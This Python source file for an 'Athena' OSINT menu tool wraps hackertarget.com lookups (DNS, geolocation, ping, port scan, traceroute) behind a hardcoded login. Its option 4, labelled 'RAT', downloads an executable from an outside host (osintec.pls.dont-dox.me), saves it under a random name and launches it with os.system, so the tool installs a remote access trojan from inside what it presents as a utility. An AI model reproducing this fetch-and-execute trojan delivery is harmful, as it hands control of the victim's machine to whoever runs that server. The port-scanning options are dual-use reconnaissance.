""" # 
Colors:

    Black	30
    Red     31
    Green	32
    Yellow	33
    Blue	34
    Purple	35
    Cyan	36
    White	37

Code:
    \x1b[1;37;40m

Example:
    print("\x1b[1;36;40mHello World\x1b[1;37;40m")
        
"""
# like it? made it in 1 day
import urllib.request
import socket
import os
import time
import random
import getpass
from requests import get

def menu():
    tool()
    
def login2():
    login()

def login():
    print("[+] Welcome to Athena [+]")
    print("")
    print("Login:\n")
    username = "athena"
    password = "athena1337"
    print("")
    
    enterUser = input("\x1b[1;32;40mUsername:\x1b[1;37;40m ")
    print("*Your password won't be visible as you type it.*")
    enterPass = getpass.getpass("\x1b[1;32;40mPassword:\x1b[1;37;40m ")

    if enterUser == username and enterPass == password:
        print("\nSuccessfully logged in, redirecting...")
        time.sleep(2)
        tool()

    else:
        os.system('clear')
        print("\x1b[1;31;40mUsername or password not found\x1b[1;37;40m")
        login2()

        
letters = 'abcdefhijklmnopqrstuvwxyz1234567890'

title = """\x1b[1;36;40m
 ▄▄▄     ▄▄▄█████▓ ██░ ██ ▓█████  ███▄    █  ▄▄▄      
▒████▄   ▓  ██▒ ▓▒▓██░ ██▒▓█   ▀  ██ ▀█   █ ▒████▄    
▒██  ▀█▄ ▒ ▓██░ ▒░▒██▀▀██░▒███   ▓██  ▀█ ██▒▒██  ▀█▄  
░██▄▄▄▄██░ ▓██▓ ░ ░▓█ ░██ ▒▓█  ▄ ▓██▒  ▐▌██▒░██▄▄▄▄██ 
 ▓█   ▓██▒ ▒██▒ ░ ░▓█▒░██▓░▒████▒▒██░   ▓██░ ▓█   ▓██▒
 ▒▒   ▓▒█░ ▒ ░░    ▒ ░░▒░▒░░ ▒░ ░░ ▒░   ▒ ▒  ▒▒   ▓▒█░
  ▒   ▒▒ ░   ░     ▒ ░▒░ ░ ░ ░  ░░ ░░   ░ ▒░  ▒   ▒▒ ░
  ░   ▒    ░       ░  ░░ ░   ░      ░   ░ ░   ░   ▒   
      ░  ░         ░  ░  ░   ░  ░         ░       ░  ░
                                                      
\x1b[1;37;40m"""

randomName = random.choice(letters) + random.choice(letters) + random.choice(letters) + random.choice(letters) + random.choice(letters) + random.choice(letters)

name = socket.gethostname()
os.system('clear')



def tool():
    os.system('clear')
    print(title)
    print("\x1b[1;32;40m ~# Made by OSINTSec #~\x1b[1;37;40m")
    print(" ")
    print("Welcome, \x1b[1;33;40m" + name + "\x1b[1;37;40m.")
    print(" ")
    print('1. DNS Lookup\n2. IP Geo Locator\n3. Ping IP\n4. RAT\n5. Port Scanner\n6. Traceroute\n')
    choice = input("Enter option: ")

    if choice == "1":

        os.system("clear")
        print("\x1b[1;36;40mDNS Lookup\x1b[1;37;40m")
        print("Example: google.com")
        print(" ")
        
        ip = input("Enter Website: ")

        api = get("https://api.hackertarget.com/dnslookup/?q=" + ip).text

        print(api)
        print(input("Press enter to back to menu"))
        menu()


    elif choice == "2":

        os.system("clear")
        print("\x1b[1;36;40mIP Geo Locator\x1b[1;37;40m")
        print(" ")
        
        ip = input("Enter IP: ")

        api = get("https://api.hackertarget.com/geoip/?q=" + ip).text

        print(api)

        print(" ")
        print(input("Press enter to back to menu"))
        menu()


    elif choice == "3":
        os.system("clear")
        print("\x1b[1;36;40mPing IP\x1b[1;37;40m")
        print(" ")
        ip = input("Enter IP: ")

        print("Please wait...")

        api = get("https://api.hackertarget.com/nping/?q=" + ip).text

        print(api)

        print(input("Press enter to back to menu"))

        menu()


    elif choice == "4":

        os.system("clear")
        #url = 'http://OSINTSec.pls.dont-dox.me/hG7.exe'
        url = 'http://osintec.pls.dont-dox.me/2aQ.exe'
        path = '/Spooky/'
        # Creates a folder to download the file. If the folder already exists, it downloads it to that folder and opens it.

        confirmation = input("You're about to rat yourself, are you sure? y/n\n")

        if confirmation == "y":

            try:
                print("Downloading RAT...")
                os.mkdir(path)
                urllib.request.urlretrieve(url, path + randomName +'.exe')
                print("RAT downloaded to " + "C:" + path)
                print(" ")
                os.system("start C:" + path + randomName + ".exe")
                      
            except:                
                urllib.request.urlretrieve(url, path + randomName +'.exe')
                print("RAT downloaded to " + "C:" + path)
                print(" ")
                os.system("start C:" + path + randomName + ".exe")

        elif confirmation == "n":
            menu()
        print(input("Press enter to back to menu"))
        menu()

    elif choice == "5":

        os.system('clear')
        print("\x1b[1;36;40mPort Scanner\x1b[1;37;40m")
        print(" ")
        ip = input("Enter IP: ")

        print("Please wait...")

        api = get("https://api.hackertarget.com/nmap/?q=" + ip).text

        print(api)
        print(input("Press enter to back to menu"))
        menu()

    elif choice == "6":
        os.system('clear')
        print("\x1b[1;36;40mTraceroute\x1b[1;37;40m")
        print(" ")
        ip = input("Enter IP/Website: ")
        print("Please wait...")

        api = get("https://api.hackertarget.com/mtr/?q=" + ip).text

        print(api)

        print(input("Press enter to back to menu"))
        menu()


    else:
        print("Invalid choice. Redirecting to menu...")
        time.sleep(2)
        os.system('clear')
        menu()
login()